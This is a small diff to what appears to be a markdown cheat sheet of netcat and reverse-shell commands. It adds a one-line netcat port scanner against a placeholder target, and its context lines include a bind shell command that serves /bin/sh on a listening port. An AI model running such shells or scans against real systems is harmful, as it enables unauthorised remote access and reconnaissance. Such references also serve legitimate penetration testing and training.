@@ -52,6 +52,11 @@ mknod /tmp/datapipe p
 nc -lp PORT -e /bin/sh
 ```
 
+- Simple port scanner
+```
+nc -v -n -w1 TARGET 1-1024
+```
+
 # Misc reverse shells
 
 Most (all) of these require opening a listener with netcat or
